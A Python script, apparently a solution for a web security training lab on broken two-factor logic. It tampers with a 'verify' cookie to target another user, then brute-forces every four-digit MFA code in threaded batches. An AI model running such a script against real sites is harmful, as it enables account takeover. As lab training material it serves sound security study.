import time
import requests
import sys
import getopt
import threading
from halo import Halo


def get_mfa_code(url):
  spinner = Halo(spinner='bouncingBar')
  session = requests.Session()
  url1 = url + "login"
  url2 = url + "login2"
  data = {"username": "wiener", "password": "peter"}
  cookies = {"verify": "carlos"}
  session.post(url1, data=data)
  session.get(url2, cookies=cookies)
  threads = []
  code = []

  def test_mfa_code(i):
    data = {"mfa-code": i}
    cookies = {"verify": "carlos"}
    response = session.post(url2, data=data, cookies=cookies)

    if "Incorrect security code" not in response.text:
      code.append(i)

  for i in range(10000):
    n = str(i)
    n = n.zfill(4)
    t = threading.Thread(target=test_mfa_code, args=(n,))
    threads.append(t)

    if code:
      spinner.succeed("Lab solved!")
      spinner.succeed(f"The code was \"{code[0]}\"")
      return 1

    if i % 50 == 0:
      for x in threads:
        x.start() 

      for x in threads:
        x.join()

      threads = []
      time.sleep(5)
      spinner.start(f"{i} codes tested...")

    i += 1


def main(argv):
  help_message = "This is the script for:\n'2FA broken logic'\n\nUsage: python3 auth-6.py -u <url>"

  try:
    opts, args = getopt.getopt(argv, "hu:")
  except getopt.GetoptError:
    print(help_message)
    print("\x1b[?25h", end="") # Make cursor visible
    sys.exit(1)

  for opt, arg in opts:
    if opt == "-u":
      url = arg
    elif opt == "-h":
      print(help_message)
      print("\x1b[?25h", end="") # Make cursor visible
      sys.exit()

  get_mfa_code(url)


if __name__ == "__main__":
  print("\x1b[?25l", end="") # Hide Cursor
  main(sys.argv[1:])
  print("\x1b[?25h", end="") # Make cursor visible
  sys.exit()